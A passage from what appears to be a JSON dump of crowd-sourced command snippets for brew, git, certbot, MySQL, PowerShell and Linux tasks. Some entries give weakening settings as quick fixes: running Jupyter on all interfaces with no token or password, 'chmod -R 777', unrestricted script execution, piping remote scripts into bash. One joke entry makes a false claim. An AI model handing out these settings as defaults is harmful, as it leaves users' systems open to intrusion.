    "description": "sudo apt install apt-transport-https curl gnupg  curl -s https://brave-browser-apt-release.s3.brave.com/brave-core.asc | sudo apt-key --keyring /etc/apt/trusted.gpg.d/brave-browser-release.gpg add -  echo \"deb [arch=amd64] https://brave-browser-apt-release.s3.brave.com/ stable main\" | sudo tee /etc/apt/sources.list.d/brave-browser-release.list  sudo apt update  sudo apt install brave-browser\nsudo snap install brave\n",
    "reg_date": "2021-10-11T22:02:00.000Z"
  },
  {
    "id": 723,
    "keyword": null,
    "link": null,
    "title": " break ping command",
    "description": "Ctrl + C  # Limit ping tests (here 10 times): ping -n 10 www.codegrepper.com\n",
    "reg_date": "2021-10-11T22:02:00.000Z"
  },
  {
    "id": 724,
    "keyword": null,
    "link": null,
    "title": " brew apps list",
    "description": "brew list # and brew list --cask\n",
    "reg_date": "2021-10-11T22:02:00.000Z"
  },
  {
    "id": 725,
    "keyword": null,
    "link": null,
    "title": " brew install atom",
    "description": "$ brew cask install atom \n",
    "reg_date": "2021-10-11T22:02:00.000Z"
  },
  {
    "id": 726,
    "keyword": null,
    "link": null,
    "title": " brew install gcloud",
    "description": "brew install --cask google-cloud-sdk\n",
    "reg_date": "2021-10-11T22:02:00.000Z"
  },
  {
    "id": 727,
    "keyword": null,
    "link": null,
    "title": " brew install github cli",
    "description": "brew install gh\n",
    "reg_date": "2021-10-11T22:02:01.000Z"
  },
  {
    "id": 728,
    "keyword": null,
    "link": null,
    "title": " brew install iterm2",
    "description": " $ brew cask install iterm2 \n",
    "reg_date": "2021-10-11T22:02:01.000Z"
  },
  {
    "id": 729,
    "keyword": null,
    "link": null,
    "title": " brew install jdk 8",
    "description": "brew tap adoptopenjdk/openjdk brew cask install adoptopenjdk8 \n",
    "reg_date": "2021-10-11T22:02:01.000Z"
  },
  {
    "id": 730,
    "keyword": null,
    "link": null,
    "title": " brew install ngrok",
    "description": "brew cask install ngrok\n",
    "reg_date": "2021-10-11T22:02:01.000Z"
  },
  {
    "id": 731,
    "keyword": null,
    "link": null,
    "title": " brew install npm",
    "description": "brew install node\n",
    "reg_date": "2021-10-11T22:02:01.000Z"
  },
  {
    "id": 732,
    "keyword": null,
    "link": null,
    "title": " brew install openssl 1.0",
    "description": "brew install rbenv/tap/openssl@1.0\n",
    "reg_date": "2021-10-11T22:02:01.000Z"
  },
  {
    "id": 733,
    "keyword": null,
    "link": null,
    "title": " brew install pgdump",
    "description": "brew install libpq\n",
    "reg_date": "2021-10-11T22:02:02.000Z"
  },
  {
    "id": 734,
    "keyword": null,
    "link": null,
    "title": " brew install pip",
    "description": "curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py sudo easy_install pip\n$ sudo pip install --upgrade pip\n$ brew install python\n$ brew unlink python && brew link python\n$ sudo easy_install pip\n$ pip -V   $ pip3 -V\n",
    "reg_date": "2021-10-11T22:02:02.000Z"
  },
  {
    "id": 735,
    "keyword": null,
    "link": null,
    "title": " brew install virtualbox",
    "description": "brew install --cask virtualbox\n$ brew cask install virtualbox\n$ brew cask install vagrant\n",
    "reg_date": "2021-10-11T22:02:02.000Z"
  },
  {
    "id": 736,
    "keyword": null,
    "link": null,
    "title": " brew install wget",
    "description": "brew install wget\n",
    "reg_date": "2021-10-11T22:02:02.000Z"
  },
  {
    "id": 737,
    "keyword": null,
    "link": null,
    "title": " brew install wine",
    "description": "brew install --cask wine-stable\n",
    "reg_date": "2021-10-11T22:02:02.000Z"
  },
  {
    "id": 738,
    "keyword": null,
    "link": null,
    "title": " brew install zsh",
    "description": "brew install zsh\n",
    "reg_date": "2021-10-11T22:02:02.000Z"
  },
  {
    "id": 739,
    "keyword": null,
    "link": null,
    "title": " brew nmap install",
    "description": "brew install nmap\n",
    "reg_date": "2021-10-11T22:02:03.000Z"
  },
  {
    "id": 740,
    "keyword": null,
    "link": null,
    "title": " brew reinstall mysql",
    "description": "# To uninstall brew uninstall mysql@5.7 rm -rf /usr/local/var/mysql rm /usr/local/etc/my.cnf # To Reinstall brew install mysql@5.7 brew link --force mysql@5.7 brew services start mysql@5.7\n",
    "reg_date": "2021-10-11T22:02:03.000Z"
  },
  {
    "id": 741,
    "keyword": null,
    "link": null,
    "title": " brew sdkman",
    "description": "$ curl -s \"https://get.sdkman.io\" | bash\n",
    "reg_date": "2021-10-11T22:02:03.000Z"
  },
  {
    "id": 742,
    "keyword": null,
    "link": null,
    "title": " brew see list of installed packages",
    "description": "brew list and brew list --cask Running brew list will show a list of all your installed Homebrew packages.  In addition, brew list --cask will provide the items installed using Homebrew Cask.\n",
    "reg_date": "2021-10-11T22:02:03.000Z"
  },
  {
    "id": 743,
    "keyword": null,
    "link": null,
    "title": " brew service start redis",
    "description": "brew services start redis \n",
    "reg_date": "2021-10-11T22:02:03.000Z"
  },
  {
    "id": 744,
    "keyword": null,
    "link": null,
    "title": " brew services start mongodb",
    "description": "//Starts Mongdb server @ mongodb://127.0.0.1:27017/ brew services start mongodb-community@4.2  //Stops Mongdb server @ mongodb://127.0.0.1:27017/ brew services stop mongodb-community@4.2  //mongo mongo - starts the mongo client   \nbrew services start mongodb-community@4.4 \n//Starts Mongdb server @ mongodb://127.0.0.1:27017/ brew services start mongodb-community@4.2 mongod --config /usr/local/etc/mongod.conf --fork ps aux | grep -v grep | grep mongod mongo\n",
    "reg_date": "2021-10-11T22:02:03.000Z"
  },
  {
    "id": 745,
    "keyword": null,
    "link": null,
    "title": " brew uninstall mysql",
    "description": "# To uninstall brew uninstall mysql@5.7 rm -rf /usr/local/var/mysql rm /usr/local/etc/my.cnf # To Reinstall brew install mysql@5.7 brew link --force mysql@5.7 brew services start mysql@5.7\nbrew remove mysql brew cleanup sudo rm /usr/local/mysql sudo rm -rf /usr/local/var/mysql\n$ brew uninstall mysql  Uninstalling /usr/local/Cellar/mysql/5.6.19...\n",
    "reg_date": "2021-10-11T22:02:03.000Z"
  },
  {
    "id": 746,
    "keyword": null,
    "link": null,
    "title": " brew uninstall node",
    "description": "brew uninstall node; which node; sudo rm -rf /usr/local/bin/node; sudo rm -rf /usr/local/lib/node_modules/npm/; brew doctor; brew cleanup --prune-prefix; \nsudo rm -rf ~/.npm ~/.nvm ~/node_modules ~/.node-gyp ~/.npmrc ~/.node_repl_history sudo rm -rf /usr/local/bin/npm /usr/local/bin/node-debug /usr/local/bin/node /usr/local/bin/node-gyp sudo rm -rf /usr/local/share/man/man1/node* /usr/local/share/man/man1/npm* sudo rm -rf /usr/local/include/node /usr/local/include/node_modules sudo rm -rf /usr/local/lib/node /usr/local/lib/node_modules /usr/local/lib/dtrace/node.d sudo rm -rf /opt/local/include/node /opt/local/bin/node /opt/local/lib/node sudo rm -rf /usr/local/share/doc/node sudo rm -rf /usr/local/share/systemtap/tapset/node.stp  brew uninstall node brew doctor brew cleanup --prune-prefix\n",
    "reg_date": "2021-10-11T22:02:04.000Z"
  },
  {
    "id": 747,
    "keyword": null,
    "link": null,
    "title": " bring job number to foreground linux",
    "description": "fg %job_number\n",
    "reg_date": "2021-10-11T22:02:04.000Z"
  },
  {
    "id": 748,
    "keyword": null,
    "link": null,
    "title": " bs4.FeatureNotFound: Couldn't find a tree builder with the features you requested: lxml. Do you need to install a parser library?",
    "description": "pip install lxml \npip install lxml\n",
    "reg_date": "2021-10-11T22:02:04.000Z"
  },
  {
    "id": 749,
    "keyword": null,
    "link": null,
    "title": " btw i use arch linux",
    "description": "It is a memes bros. It is a full time job to install & maintain Arch without getting paid\n",
    "reg_date": "2021-10-11T22:02:04.000Z"
  },
  {
    "id": 750,
    "keyword": null,
    "link": null,
    "title": " build.ps1 fie cannot be loaded the file is not digitally signed you cannot run this script on the current system",
    "description": "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass\n",
    "reg_date": "2021-10-11T22:02:04.000Z"
  },
  {
    "id": 751,
    "keyword": null,
    "link": null,
    "title": " bypass login jupyter ubuntu",
    "description": "jupyter notebook --ip='*' --NotebookApp.token='' --NotebookApp.password=''\n",
    "reg_date": "2021-10-11T22:02:04.000Z"
  },
  {
    "id": 752,
    "keyword": null,
    "link": null,
    "title": " c++ build system in sublime linux for competetive programming",
    "description": "{\"cmd\": [\"g++\", \"-std=c++14\", \"$file\", \"-o\", \"${file_path}/${file_base_name}\"],\"file_regex\": \"^(..[^:]*):([0-9]+):?([0-9]+)?:? (.*)$\",\"working_dir\": \"${file_path}\",\"selector\": \"source.c, source.c++, source.cxx, source.cpp\",\"variants\":[{\"name\": \"Run\",\"cmd\": [\"bash\", \"-c\", \"g++ -std=c++14 '${file}' -o '${file_path}/${file_base_name}' && terminator -x bash -c '\\\"${file_path}/${file_base_name}\\\" ; read'\"]}]}\n",
    "reg_date": "2021-10-11T22:02:04.000Z"
  },
  {
    "id": 753,
    "keyword": null,
    "link": null,
    "title": " calculate float division",
    "description": "bc -l <<< '10/3' # Fast way 3.33333333333333333333 bc <<< 'scale=2; 10/3' #Define also how many decimals to take in scale 3.33\n",
    "reg_date": "2021-10-11T22:02:05.000Z"
  },
  {
    "id": 754,
    "keyword": null,
    "link": null,
    "title": " can't connect to local mysql server through socket '/var/run/mysqld/mysqld.sock'",
    "description": "# Start your mysql server /etc/init.d/mysql start\n> ln -s /var/lib/mysql/mysql.sock /tmp/mysql.sock >  > service mysql start or service mysql start\nservice mysql start \n# this saved my ass # first  you must perform a graceful shutdown of the server from the command line rather than powering off the server shutdown -h now  # an additional method for getting it back up again when you run into this problem is to move mysql.sock  # to centos mv /var/lib/mysql/mysql.sock /var/lib/mysql/mysql.sock.bak  # to ubuntu mv /var/run/mysqld/mysqld.sock /var/run/mysqld/mysqld.sock.bak  # restart mysql service mysqld start\nsudo apt-get install mysql-server \n#/usr/sbin/mysqld --defaults-file=/etc/mysql/my.cnf --basedir=/usr --datadir=/var/lib/mysql --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock \n",
    "reg_date": "2021-10-11T22:02:05.000Z"
  },
  {
    "id": 755,
    "keyword": null,
    "link": null,
    "title": " can't kill docker container",
    "description": "$ sudo systemctl restart docker.socket docker.service $ docker rm <container id> \ndocker kill [OPTIONS] CONTAINER [CONTAINER...]\n",
    "reg_date": "2021-10-11T22:02:05.000Z"
  },
  {
    "id": 756,
    "keyword": null,
    "link": null,
    "title": " can't resolve 'sass-loader' vue",
    "description": "npm install sass-loader -D  npm install node-sass -D \n",
    "reg_date": "2021-10-11T22:02:05.000Z"
  },
  {
    "id": 757,
    "keyword": null,
    "link": null,
    "title": " can i go back to bash from zsh mac",
    "description": "chsh -s /bin/bash\n",
    "reg_date": "2021-10-11T22:02:05.000Z"
  },
  {
    "id": 758,
    "keyword": null,
    "link": null,
    "title": " can i install linux on an external hard drive",
    "description": "Q) can i install linux on an external hard drive Ans) Yes you can\n",
    "reg_date": "2021-10-11T22:02:05.000Z"
  },
  {
    "id": 759,
    "keyword": null,
    "link": null,
    "title": " can linux terminal crash",
    "description": "yes it can! just type in cat /bin/bash and your computer will explode! Good luck! (Also you cant do Ctrl+C so no going back!)\n",
    "reg_date": "2021-10-11T22:02:05.000Z"
  },
  {
    "id": 760,
    "keyword": null,
    "link": null,
    "title": " can we declare state outside the class",
    "description": "State is can be declare only in class if u want to declare in functional component use method useState(); \n",
    "reg_date": "2021-10-11T22:02:06.000Z"
  },
  {
    "id": 761,
    "keyword": null,
    "link": null,
    "title": " cancel a commit not pushed",
    "description": "git reset --soft HEAD~\n# delete the last commit $git reset &ndash;hard HEAD~ \ngit reset <previous label or sha1> git commit -am \"blabla\" git push -f <remote-name> <branch-name>\n",
    "reg_date": "2021-10-11T22:02:06.000Z"
  },
  {
    "id": 762,
    "keyword": null,
    "link": null,
    "title": " cancel a merge git",
    "description": "git merge --abort\n",
    "reg_date": "2021-10-11T22:02:06.000Z"
  },
  {
    "id": 763,
    "keyword": null,
    "link": null,
    "title": " cancel merge",
    "description": "git merge --abort\ngit merge --abort \ngit reset --hard HEAD~1 \ngit reset --hard HEAD\n// find the commit hash git log --oneline  git revert -m 1 [commit-hash]  // https://www.datree.io/resources/git-undo-merge\n",
    "reg_date": "2021-10-11T22:02:06.000Z"
  },
  {
    "id": 764,
    "keyword": null,
    "link": null,
    "title": " cancel merging",
    "description": "git merge --abort\n",
    "reg_date": "2021-10-11T22:02:06.000Z"
  },
  {
    "id": 765,
    "keyword": null,
    "link": null,
    "title": " cancelar merge",
    "description": "git merge --abort \n",
    "reg_date": "2021-10-11T22:02:06.000Z"
  },
  {
    "id": 766,
    "keyword": null,
    "link": null,
    "title": " cannot be loaded because running scripts is disabled on this system.",
    "description": "Set-ExecutionPolicy -ExecutionPolicy Unrestricted \nSet-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted \nSet-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser \nSet-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass\nPS C:\\> Set-ExecutionPolicy RemoteSigned\nPS C:\\> Set-ExecutionPolicy RemoteSigned  \n",
    "reg_date": "2021-10-11T22:02:07.000Z"
  },
  {
    "id": 767,
    "keyword": null,
    "link": null,
    "title": " cannot be loaded because running scripts is disabled on this system",
    "description": "Set-ExecutionPolicy -ExecutionPolicy Unrestricted \nSet-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted\nSet-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser \nPS C:\\> Set-ExecutionPolicy RemoteSigned  \nSet-ExecutionPolicy -ExecutionPolicy Unrestricted\nSet-ExecutionPolicy RemoteSigned \nGet-ExecutionPolicy -List | Set-ExecutionPolicy Unrestricted\n",
    "reg_date": "2021-10-11T22:02:07.000Z"
  },
  {
    "id": 768,
    "keyword": null,
    "link": null,
    "title": " cannot determine which native sdk version your project uses because the module `expo` is not installed. please install it with `yarn add expo` and try again.",
    "description": "Try npm install expo instead of yard add expo.  Note: yarn is another package manager just like npm. If you have npm installed already then you can replace yarn add with npm install always.\n",
    "reg_date": "2021-10-11T22:02:07.000Z"
  },
  {
    "id": 769,
    "keyword": null,
    "link": null,
    "title": " cannot find module 'sass' vue",
    "description": "npm install --save-dev node-sass \nnpm install sass-loader --save-dev\n",
    "reg_date": "2021-10-11T22:02:07.000Z"
  },
  {
    "id": 770,
    "keyword": null,
    "link": null,
    "title": " cannot find name 'require'",
    "description": "npm install @types/node --save-dev \n// Angular: npm install @types/node --save-dev  // in tsconfig.app.js  \"compilerOptions\": { \t...     \"typeRoots\": [ \"../node_modules/@types\" ],     \"types\": [\"node\"] \t...   }\n",
    "reg_date": "2021-10-11T22:02:07.000Z"
  },
  {
    "id": 771,
    "keyword": null,
    "link": null,
    "title": " cannot import numpy in py file ubuntu",
    "description": "sudo apt install python-numpy python-pandas  \n",
    "reg_date": "2021-10-11T22:02:07.000Z"
  },
  {
    "id": 772,
    "keyword": null,
    "link": null,
    "title": " cannot import urlencode from werkzeug",
    "description": "pip install werkzeug==0.16.0 # Use an older version of werkzeug # or let a newer version of werkzeug import from werkzeug.urls\n",
    "reg_date": "2021-10-11T22:02:07.000Z"
  },
  {
    "id": 773,
    "keyword": null,
    "link": null,
    "title": " canot creat new app react js error fetch npx",
    "description": "npm init npm install create-react-app npx create-react-app myapp\n",
    "reg_date": "2021-10-11T22:02:08.000Z"
  },
  {
    "id": 774,
    "keyword": null,
    "link": null,
    "title": " capacitor 3 camera",
    "description": "npm install @capacitor/camera npx cap sync\n",
    "reg_date": "2021-10-11T22:02:08.000Z"
  },
  {
    "id": 775,
    "keyword": null,
    "link": null,
    "title": " capacitor live reload",
    "description": "ionic cap run android -l --external\nionic cap run ios -l --external\n",
    "reg_date": "2021-10-11T22:02:08.000Z"
  },
  {
    "id": 776,
    "keyword": null,
    "link": null,
    "title": " cara uninstall di centos 7",
    "description": "yum remove (Application Name) yum remove vnc-server\n",
    "reg_date": "2021-10-11T22:02:08.000Z"
  },
  {
    "id": 777,
    "keyword": null,
    "link": null,
    "title": " case syntax shell",
    "description": "case word in    pattern1)       # Statement(s) to be executed if pattern1 matches       ;;    pattern2)       # Statement(s) to be executed if pattern2 matches       ;;    pattern3)       # Statement(s) to be executed if pattern3 matches       ;;    *)      # Default condition to be executed      ;; esac \ncase \"$1\" in         start)             start ;;         stop)             stop ;;         restart)             stop; start ;;         *)             echo $\"Usage: $0 {start|stop|restart}\"             exit 1 esac\n#!/bin/sh  echo \"Please talk to me ...\" while : do   read INPUT_STRING   case $INPUT_STRING in \thello) \t\techo \"Hello yourself!\" \t\t;; \tbye) \t\techo \"See you again!\" \t\tbreak \t\t;; \t*) \t\techo \"Sorry, I don't understand\" \t\t;;   esac done echo  echo \"That's all folks!\"\n",
    "reg_date": "2021-10-11T22:02:08.000Z"
  },
  {
    "id": 778,
    "keyword": null,
    "link": null,
    "title": " cassandra get table size",
    "description": "nodetool cfstats -- <keyspace>.<table>\n",
    "reg_date": "2021-10-11T22:02:09.000Z"
  },
  {
    "id": 779,
    "keyword": null,
    "link": null,
    "title": " cat /etc/os-release",
    "description": "cat /etc/os-release\ncat /etc/os-release \n",
    "reg_date": "2021-10-11T22:02:09.000Z"
  },
  {
    "id": 780,
    "keyword": null,
    "link": null,
    "title": " cat ~/.ssh/id rsa.pub",
    "description": "open generated ssh key cat ~/.ssh/id_rsa.pub \n",
    "reg_date": "2021-10-11T22:02:09.000Z"
  },
  {
    "id": 781,
    "keyword": null,
    "link": null,
    "title": " cd not working in cmd",
    "description": "// You can use  cd /d d:\\Docs\\Java\ncd /d -- your path here -- \nC:\\...\\Admin> d: D:\\>cd \"Docs\\Java\"  D:\\Docs\\Java> \n",
    "reg_date": "2021-10-11T22:02:09.000Z"
  },
  {
    "id": 782,
    "keyword": null,
    "link": null,
    "title": " cdk init",
    "description": "cdk init --language=typescript app\n",
    "reg_date": "2021-10-11T22:02:09.000Z"
  },
  {
    "id": 783,
    "keyword": null,
    "link": null,
    "title": " centos 7 apache restart",
    "description": "sudo systemctl restart httpd.service\n",
    "reg_date": "2021-10-11T22:02:09.000Z"
  },
  {
    "id": 784,
    "keyword": null,
    "link": null,
    "title": " centos install lsb release",
    "description": "sudo yum install redhat-lsb\n",
    "reg_date": "2021-10-11T22:02:10.000Z"
  },
  {
    "id": 785,
    "keyword": null,
    "link": null,
    "title": " centos install vim",
    "description": "sudo yum install vim-enhanced -y\n",
    "reg_date": "2021-10-11T22:02:10.000Z"
  },
  {
    "id": 786,
    "keyword": null,
    "link": null,
    "title": " centos install wget",
    "description": "sudo yum install wget\n",
    "reg_date": "2021-10-11T22:02:10.000Z"
  },
  {
    "id": 787,
    "keyword": null,
    "link": null,
    "title": " centos ls file size",
    "description": "ls -l --block-size=M\n",
    "reg_date": "2021-10-11T22:02:10.000Z"
  },
  {
    "id": 788,
    "keyword": null,
    "link": null,
    "title": " centos stop apache",
    "description": "systemctl restart httpd.service systemctl start httpd.service systemctl stop httpd.service\n",
    "reg_date": "2021-10-11T22:02:10.000Z"
  },
  {
    "id": 789,
    "keyword": null,
    "link": null,
    "title": " cerbot apache install",
    "description": "sudo apt-get install python3-certbot-apache\n",
    "reg_date": "2021-10-11T22:02:10.000Z"
  },
  {
    "id": 790,
    "keyword": null,
    "link": null,
    "title": " certbot add new domain",
    "description": "sudo certbot --apache -d your_domain -d www.your_domain\nsudo certbot --expand -d newsub.existingdomain.com -d newsub.newdomain.com\n",
    "reg_date": "2021-10-11T22:02:10.000Z"
  },
  {
    "id": 791,
    "keyword": null,
    "link": null,
    "title": " certbot add new domain pache",
    "description": "sudo certbot --apache -d your_domain -d www.your_domain\n",
    "reg_date": "2021-10-11T22:02:10.000Z"
  },
  {
    "id": 792,
    "keyword": null,
    "link": null,
    "title": " certbot apache install",
    "description": "sudo certbot --apache -d your_domain -d www.your_domain\n sudo apt-get update sudo apt-get install software-properties-common sudo apt-get install certbot sudo apt-get install python-certbot-apache # apache config sudo certbot --apache sudo certbot --apache -d your_domain -d www.your_domain \nsudo apt install python3-certbot-apache\n",
    "reg_date": "2021-10-11T22:02:12.000Z"
  },
  {
    "id": 793,
    "keyword": null,
    "link": null,
    "title": " certbot apache site",
    "description": "sudo certbot --apache -d your_domain -d www.your_domain\nsudo apt install python3-certbot-apache\nsudo apt install certbot python3-certbot-apache\n",
    "reg_date": "2021-10-11T22:02:12.000Z"
  },
  {
    "id": 794,
    "keyword": null,
    "link": null,
    "title": " certbot delete certificate",
    "description": "certbot delete --cert-name example.com\nsudo certbot delete --cert-name example.com\n$ sudo certbot delete --cert-name example.com\n$ sudo certbot delete\n",
    "reg_date": "2021-10-11T22:02:12.000Z"
  },
  {
    "id": 795,
    "keyword": null,
    "link": null,
    "title": " certbot get new certificate apache",
    "description": "sudo certbot --apache -d your_domain -d www.your_domain\n",
    "reg_date": "2021-10-11T22:02:12.000Z"
  },
  {
    "id": 796,
    "keyword": null,
    "link": null,
    "title": " certbot list all domains",
    "description": "sudo certbot certificates\n",
    "reg_date": "2021-10-11T22:02:12.000Z"
  },
  {
    "id": 797,
    "keyword": null,
    "link": null,
    "title": " certbot nginx new domain",
    "description": "sudo certbot --nginx -d example.com\n",
    "reg_date": "2021-10-11T22:02:13.000Z"
  },
  {
    "id": 798,
    "keyword": null,
    "link": null,
    "title": " certbot remove certificate for domain",
    "description": "certbot delete --cert-name example.com\nsudo certbot delete --cert-name example.com\n",
    "reg_date": "2021-10-11T22:02:13.000Z"
  },
  {
    "id": 799,
    "keyword": null,
    "link": null,
    "title": " certbot remove certificate nginx",
    "description": "certbot delete --cert-name example.com\nsudo certbot delete --cert-name example.com\n# Show the list of certificates certbot certificates  # Remove certificates for a given domain sudo certbot delete --cert-name $mydomain\n",
    "reg_date": "2021-10-11T22:02:13.000Z"
  },
  {
    "id": 800,
    "keyword": null,
    "link": null,
    "title": " certbot remove domain",
    "description": "certbot delete --cert-name example.com\nsudo certbot delete --cert-name example.com\n",
    "reg_date": "2021-10-11T22:02:13.000Z"
  },
  {
    "id": 801,
    "keyword": null,
    "link": null,
    "title": " certbot renew",
    "description": "sudo certbot renew --dry-run\ncertbot renew\ncertbot --apache certonly -n -d example.com # --apache for apache server, use --nginx flag for nginx server # -n option execute the command without prompt # -d domain1.com to execute only for domain1.com\n",
    "reg_date": "2021-10-11T22:02:13.000Z"
  },
  {
    "id": 802,
    "keyword": null,
    "link": null,
    "title": " certbot renew single domain",
    "description": "certbot renew --cert-name domain1.com --dry-run\n",
    "reg_date": "2021-10-11T22:02:14.000Z"
  },
  {
    "id": 803,
    "keyword": null,
    "link": null,
    "title": " change all crlf to lf vscode",
    "description": "git config core.autocrlf false  git rm --cached -r .  git reset --hard \n",
    "reg_date": "2021-10-11T22:02:14.000Z"
  },
  {
    "id": 804,
    "keyword": null,
    "link": null,
    "title": " change brightness ubuntu 20.04",
    "description": "# xrandr will list the displays you have connected eg HDMI-0 or DP-0 ... xrandr  # here's an example of changing an HDMI display  # I have connected to 90% brightness xrandr --output HDMI-0 --brightness 0.90 # --output is for the name of display # --brightness is brightness ratio with 1.0 being 100%\n",
    "reg_date": "2021-10-11T22:02:14.000Z"
  },
  {
    "id": 805,
    "keyword": null,
    "link": null,
    "title": " change commit author after push",
    "description": "git commit --amend --author=\"Author Name <email@address.com>\" --no-edit \n git rebase -i HEAD~2  git commit --amend --author=\"Cesar Bueno <cesar.bueno.tx@gmail.com>\"  git rebase --continue\n",
    "reg_date": "2021-10-11T22:02:14.000Z"
  },
  {
    "id": 806,
    "keyword": null,
    "link": null,
    "title": " change date linux",
    "description": "date -s \"19 APR 2012 11:14:00\" \ndate --set=\"YYYYMMDD HH:MM:SS\"\nsudo date -s \"$(wget -qSO- --max-redirect=0 google.com 2>&1 | grep Date: | cut -d' ' -f5-8)Z\" sudo hwclock --systohc\n",
    "reg_date": "2021-10-11T22:02:14.000Z"
  },
  {
    "id": 807,
    "keyword": null,
    "link": null,
    "title": " change default directory from screenshots to directory mac",
    "description": " #change default directory from screenshots to directory ubuntu export GIO_EXTRA_MODULES=/usr/lib/x86_64-linux-gnu/gio/modules/ gsettings set org.gnome.gnome-screenshot auto-save-directory '/home/michel/T&eacute;l&eacute;chargements'  #Read the value of the variable: gsettings get org.gnome.gnome-screenshot auto-save-directory  #Reset the variable to its default value: gsettings reset org.gnome.gnome-screenshot auto-save-directory\n",
    "reg_date": "2021-10-11T22:02:15.000Z"
  },
  {
    "id": 808,
    "keyword": null,
    "link": null,
    "title": " change default directory from screenshots to directory ubuntu",
    "description": " #change default directory from screenshots to directory ubuntu export GIO_EXTRA_MODULES=/usr/lib/x86_64-linux-gnu/gio/modules/ gsettings set org.gnome.gnome-screenshot auto-save-directory '/home/michel/T&eacute;l&eacute;chargements'  #Read the value of the variable: gsettings get org.gnome.gnome-screenshot auto-save-directory  #Reset the variable to its default value: gsettings reset org.gnome.gnome-screenshot auto-save-directory\n",
    "reg_date": "2021-10-11T22:02:15.000Z"
  },
  {
    "id": 809,
    "keyword": null,
    "link": null,
    "title": " change default shell fish",
    "description": "> echo /usr/local/bin/fish | sudo tee -a /etc/shells > chsh -s /usr/local/bin/fish\n",
    "reg_date": "2021-10-11T22:02:15.000Z"
  },
  {
    "id": 810,
    "keyword": null,
    "link": null,
    "title": " change dns linux",
    "description": "sudo vim /etc/resolvconf/resolv.conf.d/base  # add nameserver(s) like this. nameserver 8.8.8.8 nameserver 8.8.4.4  $ sudo resolvconf -u\n$ sudo vim /etc/resolvconf/resolv.conf.d/base\n",
    "reg_date": "2021-10-11T22:02:15.000Z"
  },
  {
    "id": 811,
    "keyword": null,
    "link": null,
    "title": " change folder permisson in mac",
    "description": "sudo chmod -R 777 myFolder\n",
    "reg_date": "2021-10-11T22:02:15.000Z"
  },
  {
    "id": 812,
    "keyword": null,
    "link": null,
    "title": " change git account terminal",
    "description": "git config --list git config --global user.name \"Full Name\" git config --global user.email \"email@address.com\"\n",
    "reg_date": "2021-10-11T22:02:15.000Z"
  },
  {
    "id": 813,
    "keyword": null,
    "link": null,
    "title": " change git commit message",
    "description": "git commit --amend -m \"New commit message\"\n$ git commit --amend -m \"New and correct message\" \ngit commit --amend -m \"New commit message.\"\ngit commit --amend --no-edit\n$ git commit --amend -m \"New and correct message\"\ngit commit --amend -m \"New message\"\n",
    "reg_date": "2021-10-11T22:02:16.000Z"
  },
  {
    "id": 814,
    "keyword": null,
    "link": null,
    "title": " change git default editor to vscode",
    "description": "git config --global core.editor \"code --wait\"\ngit config --global core.editor code\ngit config --global core.editor \"'C:\\Program Files (x86)\\Microsoft VS Code\\code.exe' -w\" \n",
    "reg_date": "2021-10-11T22:02:16.000Z"
  },
  {
    "id": 815,
    "keyword": null,
    "link": null,
    "title": " change git remote",
    "description": "git remote set-url origin new.git.url/here\n git remote -v  git remote set-url origin https://github.com/USERNAME/REPOSITORY.git\n# change remote url git remote set-url origin https://github.com/USERNAME/REPOSITORY.git\ngit remote set-url origin https://hostname/USERNAME/REPOSITORY.git\n# Overwriting an existing git url: git remote set-url origin <git_url>\ngit remote set-url origin git@your.git.repo.example.com:user/repository2.git\n",
    "reg_date": "2021-10-11T22:02:16.000Z"
  },
  {
    "id": 816,
    "keyword": null,
    "link": null,
    "title": " change hostname ubuntu 20.04",
    "description": "#1- Delete the old name and setup new name sudo hostnamectl set-hostname newHostname  #2- Edit the /etc/hosts file: sudo nano /etc/hosts  #3- Reboot the system  sudo reboot  #4- To check the new hostname hostnamectl\n#Change hostname sudo hostnamectl set-hostname newHostName  #Edit the /etc/hosts file, and replace existing hostname with a new hostname. sudo nano /etc/hosts #Reboot the system to changes take effect sudo reboot\n",
    "reg_date": "2021-10-11T22:02:16.000Z"
  },
  {
    "id": 817,
    "keyword": null,
    "link": null,
    "title": " change last commit message",
    "description": "git commit --amend -m \"New commit message\"\n$ git commit --amend -m \"New and correct message\" \ngit commit --amend -m \"New commit message.\"\n$ git commit --amend -m \"New and correct message\"\ngit commit --amend -m \"New commit message\" #This changes the message of the most recent commit.  git rebase -i <commit hash you want to change> #This allows you to make changes to commits starting from the HEAD of the #branch tree to the specified commit. #1.This open your default editor with a list of commits and actions for each.  #By default, the action is `pick`.  #2. For any commit you wish to change the message, change `pick` to `reword`.  #Don't change the commit message. #3. Save and close the editor. #4. For each commit that is set to `reword`, the editor will reopen for change #to be made. After each change save and close the editor and wait for the next. #4. Once you're done editing all the commit messages, you'll return to the  #command prompt, and have a new tree with the updated messages.   #Other actions that can be applied are: #`p` or `pick` &ndash; to keep the commit as is #`r` or `reword` &ndash; to keep the commit's content but alter the commit message #`e`or `edit` &ndash; to keep the commit's content but stop before committing #so that you can: #   - add new content or files #   - remove content or files #   - alter the content that was going to be committed # `s` or `squash` &ndash; to combine this commit's changes into the previous commit #(the commit above it in the list) #`f` or `fixup` &ndash; to combine this commit's change into the previous one but  #drop the commit message #`x` or `exec` &ndash; to run a shell command #`d` or `drop` &ndash; to delete the commit\ngit commit --amend \n",
    "reg_date": "2021-10-11T22:02:16.000Z"
  },
  {
    "id": 818,
    "keyword": null,
    "link": null,
    "title": " change master to main git",
    "description": "$ git branch -m master main \n# Step 1  # create main branch locally, taking the history from master git branch -m master main # Step 2  # push the new local main branch to the remote repo (GitHub)  git push -u origin main # Step 3 # switch the current HEAD to the main branch git symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main # Step 4 # change the default branch on GitHub to main # https://docs.github.com/en/github/administering-a-repository/setting-the-default-branch # Step 5 # delete the master branch on the remote git push origin --delete master\n$ git branch -m master main  or create a new one  $ git checkout -b main \n# Step 1  # create main branch locally, taking the history from master git branch -m master main  # Step 2  # push the new local main branch to the remote repo (GitHub)  git push -u origin main  # Step 3 # switch the current HEAD to the main branch git symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main  # Step 4 # change the default branch on GitHub to main # 